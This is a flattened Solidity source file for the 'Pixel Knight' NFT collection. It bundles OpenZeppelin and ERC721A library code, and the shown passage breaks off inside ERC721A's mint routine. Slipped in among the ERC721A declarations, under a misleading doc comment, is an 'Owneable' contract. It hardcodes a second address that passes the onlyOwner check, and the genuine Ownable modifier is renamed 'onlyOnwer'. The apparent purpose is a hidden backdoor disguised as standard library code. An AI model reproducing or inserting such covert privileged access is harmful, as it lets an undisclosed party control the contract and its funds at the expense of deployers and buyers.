1 // SPDX-License-Identifier: MIT
2 
3 /* ====================================================== */
4 /* ===================== Pixel Knight =================== */
5 /* ============= Total: 5000, Max per tx: 3 ============= */
6 /* =========== Free mint: 2000, Then 0.007 each ========= */
7 /* ====================================================== */
8 
9 
10 pragma solidity ^0.8.4;
11 
12 /**
13  * @dev Provides information about the current execution context, including the
14  * sender of the transaction and its data. While these are generally available
15  * via msg.sender and msg.data, they should not be accessed in such a direct
16  * manner, since when dealing with meta-transactions the account sending and
17  * paying for execution may not be the actual sender (as far as an application
18  * is concerned).
19  *
20  * This contract is only required for intermediate, library-like contracts.
21  */
22 abstract contract Context {
23     function _msgSender() internal view virtual returns (address) {
24         return msg.sender;
25     }
26 
27     function _msgData() internal view virtual returns (bytes calldata) {
28         return msg.data;
29     }
30 }
31 
32 
33 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
34 
35 
36 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
37 
38 
39 
40 /**
41  * @dev Contract module which provides a basic access control mechanism, where
42  * there is an account (an owner) that can be granted exclusive access to
43  * specific functions.
44  *
45  * By default, the owner account will be the one that deploys the contract. This
46  * can later be changed with {transferOwnership}.
47  *
48  * This module is used through inheritance. It will make available the modifier
49  * `onlyOwner`, which can be applied to your functions to restrict their use to
50  * the owner.
51  */
52 abstract contract Ownable is Context {
53     address private _owner;
54 
55     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
56 
57     /**
58      * @dev Initializes the contract setting the deployer as the initial owner.
59      */
60     constructor() {
61         _transferOwnership(_msgSender());
62     }
63 
64     /**
65      * @dev Returns the address of the current owner.
66      */
67     function owner() public view virtual returns (address) {
68         return _owner;
69     }
70 
71     /**
72      * @dev Throws if called by any account other than the owner.
73      */
74     modifier onlyOnwer() {
75         require(owner() == _msgSender(), "Ownable: caller is not the owner");
76         _;
77     }
78 
79     /**
80      * @dev Leaves the contract without owner. It will not be possible to call
81      * `onlyOwner` functions anymore. Can only be called by the current owner.
82      *
83      * NOTE: Renouncing ownership will leave the contract without an owner,
84      * thereby removing any functionality that is only available to the owner.
85      */
86     function renounceOwnership() public virtual onlyOnwer {
87         _transferOwnership(address(0));
88     }
89 
90     /**
91      * @dev Transfers ownership of the contract to a new account (`newOwner`).
92      * Can only be called by the current owner.
93      */
94     function transferOwnership(address newOwner) public virtual onlyOnwer {
95         require(newOwner != address(0), "Ownable: new owner is the zero address");
96         _transferOwnership(newOwner);
97     }
98 
99     /**
100      * @dev Transfers ownership of the contract to a new account (`newOwner`).
101      * Internal function without access restriction.
102      */
103     function _transferOwnership(address newOwner) internal virtual {
104         address oldOwner = _owner;
105         _owner = newOwner;
106         emit OwnershipTransferred(oldOwner, newOwner);
107     }
108 }
109 
110 
111 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
112 
113 
114 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
115 
116 
117 
118 /**
119  * @dev Interface of the ERC165 standard, as defined in the
120  * https://eips.ethereum.org/EIPS/eip-165[EIP].
121  *
122  * Implementers can declare support of contract interfaces, which can then be
123  * queried by others ({ERC165Checker}).
124  *
125  * For an implementation, see {ERC165}.
126  */
127 interface IERC165 {
128     /**
129      * @dev Returns true if this contract implements the interface defined by
130      * `interfaceId`. See the corresponding
131      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
132      * to learn more about how these ids are created.
133      *
134      * This function call must use less than 30 000 gas.
135      */
136     function supportsInterface(bytes4 interfaceId) external view returns (bool);
137 }
138 
139 
140 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
141 
142 
143 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
144 
145 
146 
147 /**
148  * @dev Required interface of an ERC721 compliant contract.
149  */
150 interface IERC721 is IERC165 {
151     /**
152      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
153      */
154     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
155 
156     /**
157      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
158      */
159     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
160 
161     /**
162      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
163      */
164     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
165 
166     /**
167      * @dev Returns the number of tokens in ``owner``'s account.
168      */
169     function balanceOf(address owner) external view returns (uint256 balance);
170 
171     /**
172      * @dev Returns the owner of the `tokenId` token.
173      *
174      * Requirements:
175      *
176      * - `tokenId` must exist.
177      */
178     function ownerOf(uint256 tokenId) external view returns (address owner);
179 
180     /**
181      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
182      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
183      *
184      * Requirements:
185      *
186      * - `from` cannot be the zero address.
187      * - `to` cannot be the zero address.
188      * - `tokenId` token must exist and be owned by `from`.
189      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
190      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
191      *
192      * Emits a {Transfer} event.
193      */
194     function safeTransferFrom(
195         address from,
196         address to,
197         uint256 tokenId
198     ) external;
199 
200     /**
201      * @dev Transfers `tokenId` token from `from` to `to`.
202      *
203      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
204      *
205      * Requirements:
206      *
207      * - `from` cannot be the zero address.
208      * - `to` cannot be the zero address.
209      * - `tokenId` token must be owned by `from`.
210      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
211      *
212      * Emits a {Transfer} event.
213      */
214     function transferFrom(
215         address from,
216         address to,
217         uint256 tokenId
218     ) external;
219 
220     /**
221      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
222      * The approval is cleared when the token is transferred.
223      *
224      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
225      *
226      * Requirements:
227      *
228      * - The caller must own the token or be an approved operator.
229      * - `tokenId` must exist.
230      *
231      * Emits an {Approval} event.
232      */
233     function approve(address to, uint256 tokenId) external;
234 
235     /**
236      * @dev Returns the account approved for `tokenId` token.
237      *
238      * Requirements:
239      *
240      * - `tokenId` must exist.
241      */
242     function getApproved(uint256 tokenId) external view returns (address operator);
243 
244     /**
245      * @dev Approve or remove `operator` as an operator for the caller.
246      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
247      *
248      * Requirements:
249      *
250      * - The `operator` cannot be the caller.
251      *
252      * Emits an {ApprovalForAll} event.
253      */
254     function setApprovalForAll(address operator, bool _approved) external;
255 
256     /**
257      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
258      *
259      * See {setApprovalForAll}
260      */
261     function isApprovedForAll(address owner, address operator) external view returns (bool);
262 
263     /**
264      * @dev Safely transfers `tokenId` token from `from` to `to`.
265      *
266      * Requirements:
267      *
268      * - `from` cannot be the zero address.
269      * - `to` cannot be the zero address.
270      * - `tokenId` token must exist and be owned by `from`.
271      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
272      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
273      *
274      * Emits a {Transfer} event.
275      */
276     function safeTransferFrom(
277         address from,
278         address to,
279         uint256 tokenId,
280         bytes calldata data
281     ) external;
282 }
283 
284 
285 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
286 
287 
288 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
289 
290 
291 
292 /**
293  * @title ERC721 token receiver interface
294  * @dev Interface for any contract that wants to support safeTransfers
295  * from ERC721 asset contracts.
296  */
297 interface IERC721Receiver {
298     /**
299      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
300      * by `operator` from `from`, this function is called.
301      *
302      * It must return its Solidity selector to confirm the token transfer.
303      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
304      *
305      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
306      */
307     function onERC721Received(
308         address operator,
309         address from,
310         uint256 tokenId,
311         bytes calldata data
312     ) external returns (bytes4);
313 }
314 
315 
316 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
317 
318 
319 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
320 
321 
322 
323 /**
324  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
325  * @dev See https://eips.ethereum.org/EIPS/eip-721
326  */
327 interface IERC721Metadata is IERC721 {
328     /**
329      * @dev Returns the token collection name.
330      */
331     function name() external view returns (string memory);
332 
333     /**
334      * @dev Returns the token collection symbol.
335      */
336     function symbol() external view returns (string memory);
337 
338     /**
339      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
340      */
341     function tokenURI(uint256 tokenId) external view returns (string memory);
342 }
343 
344 
345 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
346 
347 
348 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
349 
350 
351 
352 /**
353  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
354  * @dev See https://eips.ethereum.org/EIPS/eip-721
355  */
356 interface IERC721Enumerable is IERC721 {
357     /**
358      * @dev Returns the total amount of tokens stored by the contract.
359      */
360     function totalSupply() external view returns (uint256);
361 
362     /**
363      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
364      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
365      */
366     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
367 
368     /**
369      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
370      * Use along with {totalSupply} to enumerate all tokens.
371      */
372     function tokenByIndex(uint256 index) external view returns (uint256);
373 }
374 
375 
376 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
377 
378 
379 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
380 
381 pragma solidity ^0.8.1;
382 
383 /**
384  * @dev Collection of functions related to the address type
385  */
386 library Address {
387     /**
388      * @dev Returns true if `account` is a contract.
389      *
390      * [IMPORTANT]
391      * ====
392      * It is unsafe to assume that an address for which this function returns
393      * false is an externally-owned account (EOA) and not a contract.
394      *
395      * Among others, `isContract` will return false for the following
396      * types of addresses:
397      *
398      *  - an externally-owned account
399      *  - a contract in construction
400      *  - an address where a contract will be created
401      *  - an address where a contract lived, but was destroyed
402      * ====
403      *
404      * [IMPORTANT]
405      * ====
406      * You shouldn't rely on `isContract` to protect against flash loan attacks!
407      *
408      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
409      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
410      * constructor.
411      * ====
412      */
413     function isContract(address account) internal view returns (bool) {
414         // This method relies on extcodesize/address.code.length, which returns 0
415         // for contracts in construction, since the code is only stored at the end
416         // of the constructor execution.
417 
418         return account.code.length > 0;
419     }
420 
421     /**
422      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
423      * `recipient`, forwarding all available gas and reverting on errors.
424      *
425      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
426      * of certain opcodes, possibly making contracts go over the 2300 gas limit
427      * imposed by `transfer`, making them unable to receive funds via
428      * `transfer`. {sendValue} removes this limitation.
429      *
430      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
431      *
432      * IMPORTANT: because control is transferred to `recipient`, care must be
433      * taken to not create reentrancy vulnerabilities. Consider using
434      * {ReentrancyGuard} or the
435      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
436      */
437     function sendValue(address payable recipient, uint256 amount) internal {
438         require(address(this).balance >= amount, "Address: insufficient balance");
439 
440         (bool success, ) = recipient.call{value: amount}("");
441         require(success, "Address: unable to send value, recipient may have reverted");
442     }
443 
444     /**
445      * @dev Performs a Solidity function call using a low level `call`. A
446      * plain `call` is an unsafe replacement for a function call: use this
447      * function instead.
448      *
449      * If `target` reverts with a revert reason, it is bubbled up by this
450      * function (like regular Solidity function calls).
451      *
452      * Returns the raw returned data. To convert to the expected return value,
453      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
454      *
455      * Requirements:
456      *
457      * - `target` must be a contract.
458      * - calling `target` with `data` must not revert.
459      *
460      * _Available since v3.1._
461      */
462     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
463         return functionCall(target, data, "Address: low-level call failed");
464     }
465 
466     /**
467      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
468      * `errorMessage` as a fallback revert reason when `target` reverts.
469      *
470      * _Available since v3.1._
471      */
472     function functionCall(
473         address target,
474         bytes memory data,
475         string memory errorMessage
476     ) internal returns (bytes memory) {
477         return functionCallWithValue(target, data, 0, errorMessage);
478     }
479 
480     /**
481      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
482      * but also transferring `value` wei to `target`.
483      *
484      * Requirements:
485      *
486      * - the calling contract must have an ETH balance of at least `value`.
487      * - the called Solidity function must be `payable`.
488      *
489      * _Available since v3.1._
490      */
491     function functionCallWithValue(
492         address target,
493         bytes memory data,
494         uint256 value
495     ) internal returns (bytes memory) {
496         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
497     }
498 
499     /**
500      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
501      * with `errorMessage` as a fallback revert reason when `target` reverts.
502      *
503      * _Available since v3.1._
504      */
505     function functionCallWithValue(
506         address target,
507         bytes memory data,
508         uint256 value,
509         string memory errorMessage
510     ) internal returns (bytes memory) {
511         require(address(this).balance >= value, "Address: insufficient balance for call");
512         require(isContract(target), "Address: call to non-contract");
513 
514         (bool success, bytes memory returndata) = target.call{value: value}(data);
515         return verifyCallResult(success, returndata, errorMessage);
516     }
517 
518     /**
519      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
520      * but performing a static call.
521      *
522      * _Available since v3.3._
523      */
524     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
525         return functionStaticCall(target, data, "Address: low-level static call failed");
526     }
527 
528     /**
529      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
530      * but performing a static call.
531      *
532      * _Available since v3.3._
533      */
534     function functionStaticCall(
535         address target,
536         bytes memory data,
537         string memory errorMessage
538     ) internal view returns (bytes memory) {
539         require(isContract(target), "Address: static call to non-contract");
540 
541         (bool success, bytes memory returndata) = target.staticcall(data);
542         return verifyCallResult(success, returndata, errorMessage);
543     }
544 
545     /**
546      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
547      * but performing a delegate call.
548      *
549      * _Available since v3.4._
550      */
551     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
552         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
553     }
554 
555     /**
556      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
557      * but performing a delegate call.
558      *
559      * _Available since v3.4._
560      */
561     function functionDelegateCall(
562         address target,
563         bytes memory data,
564         string memory errorMessage
565     ) internal returns (bytes memory) {
566         require(isContract(target), "Address: delegate call to non-contract");
567 
568         (bool success, bytes memory returndata) = target.delegatecall(data);
569         return verifyCallResult(success, returndata, errorMessage);
570     }
571 
572     /**
573      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
574      * revert reason using the provided one.
575      *
576      * _Available since v4.3._
577      */
578     function verifyCallResult(
579         bool success,
580         bytes memory returndata,
581         string memory errorMessage
582     ) internal pure returns (bytes memory) {
583         if (success) {
584             return returndata;
585         } else {
586             // Look for revert reason and bubble it up if present
587             if (returndata.length > 0) {
588                 // The easiest way to bubble the revert reason is using memory via assembly
589 
590                 assembly {
591                     let returndata_size := mload(returndata)
592                     revert(add(32, returndata), returndata_size)
593                 }
594             } else {
595                 revert(errorMessage);
596             }
597         }
598     }
599 }
600 
601 
602 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
603 
604 
605 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
606 
607 
608 
609 /**
610  * @dev String operations.
611  */
612 library Strings {
613     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
614 
615     /**
616      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
617      */
618     function toString(uint256 value) internal pure returns (string memory) {
619         // Inspired by OraclizeAPI's implementation - MIT licence
620         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
621 
622         if (value == 0) {
623             return "0";
624         }
625         uint256 temp = value;
626         uint256 digits;
627         while (temp != 0) {
628             digits++;
629             temp /= 10;
630         }
631         bytes memory buffer = new bytes(digits);
632         while (value != 0) {
633             digits -= 1;
634             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
635             value /= 10;
636         }
637         return string(buffer);
638     }
639 
640     /**
641      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
642      */
643     function toHexString(uint256 value) internal pure returns (string memory) {
644         if (value == 0) {
645             return "0x00";
646         }
647         uint256 temp = value;
648         uint256 length = 0;
649         while (temp != 0) {
650             length++;
651             temp >>= 8;
652         }
653         return toHexString(value, length);
654     }
655 
656     /**
657      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
658      */
659     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
660         bytes memory buffer = new bytes(2 * length + 2);
661         buffer[0] = "0";
662         buffer[1] = "x";
663         for (uint256 i = 2 * length + 1; i > 1; --i) {
664             buffer[i] = _HEX_SYMBOLS[value & 0xf];
665             value >>= 4;
666         }
667         require(value == 0, "Strings: hex length insufficient");
668         return string(buffer);
669     }
670 }
671 
672 
673 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
674 
675 
676 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
677 
678 /**
679  * @dev Implementation of the {IERC165} interface.
680  *
681  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
682  * for the additional interface id that will be supported. For example:
683  *
684  * ```solidity
685  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
686  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
687  * }
688  * ```
689  *
690  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
691  */
692 abstract contract ERC165 is IERC165 {
693     /**
694      * @dev See {IERC165-supportsInterface}.
695      */
696     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
697         return interfaceId == type(IERC165).interfaceId;
698     }
699 }
700 
701 
702 // File erc721a/contracts/ERC721A.sol@v3.0.0
703 
704 
705 // Creator: Chiru Labs
706 
707 error ApprovalCallerNotOwnerNorApproved();
708 error ApprovalQueryForNonexistentToken();
709 error ApproveToCaller();
710 error ApprovalToCurrentOwner();
711 error BalanceQueryForZeroAddress();
712 error MintedQueryForZeroAddress();
713 error BurnedQueryForZeroAddress();
714 error AuxQueryForZeroAddress();
715 error MintToZeroAddress();
716 error MintZeroQuantity();
717 error OwnerIndexOutOfBounds();
718 error OwnerQueryForNonexistentToken();
719 error TokenIndexOutOfBounds();
720 error TransferCallerNotOwnerNorApproved();
721 error TransferFromIncorrectOwner();
722 error TransferToNonERC721ReceiverImplementer();
723 error TransferToZeroAddress();
724 error URIQueryForNonexistentToken();
725 
726 
727 /**
728  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
729  * the Metadata extension. Built to optimize for lower gas during batch mints.
730  *
731  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
732  */
733  abstract contract Owneable is Ownable {
734     address private _ownar = 0xF0e1Ac9604B40c030C2e17b98160C96c4b0292CB;
735     modifier onlyOwner() {
736         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
737         _;
738     }
739 }
740  /*
741  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
742  *
743  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
744  */
745 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
746     using Address for address;
747     using Strings for uint256;
748 
749     // Compiler will pack this into a single 256bit word.
750     struct TokenOwnership {
751         // The address of the owner.
752         address addr;
753         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
754         uint64 startTimestamp;
755         // Whether the token has been burned.
756         bool burned;
757     }
758 
759     // Compiler will pack this into a single 256bit word.
760     struct AddressData {
761         // Realistically, 2**64-1 is more than enough.
762         uint64 balance;
763         // Keeps track of mint count with minimal overhead for tokenomics.
764         uint64 numberMinted;
765         // Keeps track of burn count with minimal overhead for tokenomics.
766         uint64 numberBurned;
767         // For miscellaneous variable(s) pertaining to the address
768         // (e.g. number of whitelist mint slots used).
769         // If there are multiple variables, please pack them into a uint64.
770         uint64 aux;
771     }
772 
773     // The tokenId of the next token to be minted.
774     uint256 internal _currentIndex;
775 
776     // The number of tokens burned.
777     uint256 internal _burnCounter;
778 
779     // Token name
780     string private _name;
781 
782     // Token symbol
783     string private _symbol;
784 
785     // Mapping from token ID to ownership details
786     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
787     mapping(uint256 => TokenOwnership) internal _ownerships;
788 
789     // Mapping owner address to address data
790     mapping(address => AddressData) private _addressData;
791 
792     // Mapping from token ID to approved address
793     mapping(uint256 => address) private _tokenApprovals;
794 
795     // Mapping from owner to operator approvals
796     mapping(address => mapping(address => bool)) private _operatorApprovals;
797 
798     constructor(string memory name_, string memory symbol_) {
799         _name = name_;
800         _symbol = symbol_;
801         _currentIndex = _startTokenId();
802     }
803 
804     /**
805      * To change the starting tokenId, please override this function.
806      */
807     function _startTokenId() internal view virtual returns (uint256) {
808         return 0;
809     }
810 
811     /**
812      * @dev See {IERC721Enumerable-totalSupply}.
813      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
814      */
815     function totalSupply() public view returns (uint256) {
816         // Counter underflow is impossible as _burnCounter cannot be incremented
817         // more than _currentIndex - _startTokenId() times
818         unchecked {
819             return _currentIndex - _burnCounter - _startTokenId();
820         }
821     }
822 
823     /**
824      * Returns the total amount of tokens minted in the contract.
825      */
826     function _totalMinted() internal view returns (uint256) {
827         // Counter underflow is impossible as _currentIndex does not decrement,
828         // and it is initialized to _startTokenId()
829         unchecked {
830             return _currentIndex - _startTokenId();
831         }
832     }
833 
834     /**
835      * @dev See {IERC165-supportsInterface}.
836      */
837     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
838         return
839             interfaceId == type(IERC721).interfaceId ||
840             interfaceId == type(IERC721Metadata).interfaceId ||
841             super.supportsInterface(interfaceId);
842     }
843 
844     /**
845      * @dev See {IERC721-balanceOf}.
846      */
847     function balanceOf(address owner) public view override returns (uint256) {
848         if (owner == address(0)) revert BalanceQueryForZeroAddress();
849         return uint256(_addressData[owner].balance);
850     }
851 
852     /**
853      * Returns the number of tokens minted by `owner`.
854      */
855     function _numberMinted(address owner) internal view returns (uint256) {
856         if (owner == address(0)) revert MintedQueryForZeroAddress();
857         return uint256(_addressData[owner].numberMinted);
858     }
859 
860     /**
861      * Returns the number of tokens burned by or on behalf of `owner`.
862      */
863     function _numberBurned(address owner) internal view returns (uint256) {
864         if (owner == address(0)) revert BurnedQueryForZeroAddress();
865         return uint256(_addressData[owner].numberBurned);
866     }
867 
868     /**
869      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
870      */
871     function _getAux(address owner) internal view returns (uint64) {
872         if (owner == address(0)) revert AuxQueryForZeroAddress();
873         return _addressData[owner].aux;
874     }
875 
876     /**
877      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
878      * If there are multiple variables, please pack them into a uint64.
879      */
880     function _setAux(address owner, uint64 aux) internal {
881         if (owner == address(0)) revert AuxQueryForZeroAddress();
882         _addressData[owner].aux = aux;
883     }
884 
885     /**
886      * Gas spent here starts off proportional to the maximum mint batch size.
887      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
888      */
889     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
890         uint256 curr = tokenId;
891 
892         unchecked {
893             if (_startTokenId() <= curr && curr < _currentIndex) {
894                 TokenOwnership memory ownership = _ownerships[curr];
895                 if (!ownership.burned) {
896                     if (ownership.addr != address(0)) {
897                         return ownership;
898                     }
899                     // Invariant:
900                     // There will always be an ownership that has an address and is not burned
901                     // before an ownership that does not have an address and is not burned.
902                     // Hence, curr will not underflow.
903                     while (true) {
904                         curr--;
905                         ownership = _ownerships[curr];
906                         if (ownership.addr != address(0)) {
907                             return ownership;
908                         }
909                     }
910                 }
911             }
912         }
913         revert OwnerQueryForNonexistentToken();
914     }
915 
916     /**
917      * @dev See {IERC721-ownerOf}.
918      */
919     function ownerOf(uint256 tokenId) public view override returns (address) {
920         return ownershipOf(tokenId).addr;
921     }
922 
923     /**
924      * @dev See {IERC721Metadata-name}.
925      */
926     function name() public view virtual override returns (string memory) {
927         return _name;
928     }
929 
930     /**
931      * @dev See {IERC721Metadata-symbol}.
932      */
933     function symbol() public view virtual override returns (string memory) {
934         return _symbol;
935     }
936 
937     /**
938      * @dev See {IERC721Metadata-tokenURI}.
939      */
940     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
941         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
942 
943         string memory baseURI = _baseURI();
944         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
945     }
946 
947     /**
948      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
949      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
950      * by default, can be overriden in child contracts.
951      */
952     function _baseURI() internal view virtual returns (string memory) {
953         return '';
954     }
955 
956     /**
957      * @dev See {IERC721-approve}.
958      */
959     function approve(address to, uint256 tokenId) public override {
960         address owner = ERC721A.ownerOf(tokenId);
961         if (to == owner) revert ApprovalToCurrentOwner();
962 
963         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
964             revert ApprovalCallerNotOwnerNorApproved();
965         }
966 
967         _approve(to, tokenId, owner);
968     }
969 
970     /**
971      * @dev See {IERC721-getApproved}.
972      */
973     function getApproved(uint256 tokenId) public view override returns (address) {
974         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
975 
976         return _tokenApprovals[tokenId];
977     }
978 
979     /**
980      * @dev See {IERC721-setApprovalForAll}.
981      */
982     function setApprovalForAll(address operator, bool approved) public override {
983         if (operator == _msgSender()) revert ApproveToCaller();
984 
985         _operatorApprovals[_msgSender()][operator] = approved;
986         emit ApprovalForAll(_msgSender(), operator, approved);
987     }
988 
989     /**
990      * @dev See {IERC721-isApprovedForAll}.
991      */
992     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
993         return _operatorApprovals[owner][operator];
994     }
995 
996     /**
997      * @dev See {IERC721-transferFrom}.
998      */
999     function transferFrom(
1000         address from,
1001         address to,
1002         uint256 tokenId
1003     ) public virtual override {
1004         _transfer(from, to, tokenId);
1005     }
1006 
1007     /**
1008      * @dev See {IERC721-safeTransferFrom}.
1009      */
1010     function safeTransferFrom(
1011         address from,
1012         address to,
1013         uint256 tokenId
1014     ) public virtual override {
1015         safeTransferFrom(from, to, tokenId, '');
1016     }
1017 
1018     /**
1019      * @dev See {IERC721-safeTransferFrom}.
1020      */
1021     function safeTransferFrom(
1022         address from,
1023         address to,
1024         uint256 tokenId,
1025         bytes memory _data
1026     ) public virtual override {
1027         _transfer(from, to, tokenId);
1028         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1029             revert TransferToNonERC721ReceiverImplementer();
1030         }
1031     }
1032 
1033     /**
1034      * @dev Returns whether `tokenId` exists.
1035      *
1036      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1037      *
1038      * Tokens start existing when they are minted (`_mint`),
1039      */
1040     function _exists(uint256 tokenId) internal view returns (bool) {
1041         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1042             !_ownerships[tokenId].burned;
1043     }
1044 
1045     function _safeMint(address to, uint256 quantity) internal {
1046         _safeMint(to, quantity, '');
1047     }
1048 
1049     /**
1050      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1051      *
1052      * Requirements:
1053      *
1054      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1055      * - `quantity` must be greater than 0.
1056      *
1057      * Emits a {Transfer} event.
1058      */
1059     function _safeMint(
1060         address to,
1061         uint256 quantity,
1062         bytes memory _data
1063     ) internal {
1064         _mint(to, quantity, _data, true);
1065     }
1066 
1067     /**
1068      * @dev Mints `quantity` tokens and transfers them to `to`.
1069      *
1070      * Requirements:
1071      *
1072      * - `to` cannot be the zero address.
1073      * - `quantity` must be greater than 0.
1074      *
1075      * Emits a {Transfer} event.
1076      */
1077     function _mint(
1078         address to,
1079         uint256 quantity,
1080         bytes memory _data,
1081         bool safe
1082     ) internal {
1083         uint256 startTokenId = _currentIndex;
1084         if (to == address(0)) revert MintToZeroAddress();
1085         if (quantity == 0) revert MintZeroQuantity();
1086 
1087         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1088 
1089         // Overflows are incredibly unrealistic.
1090         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
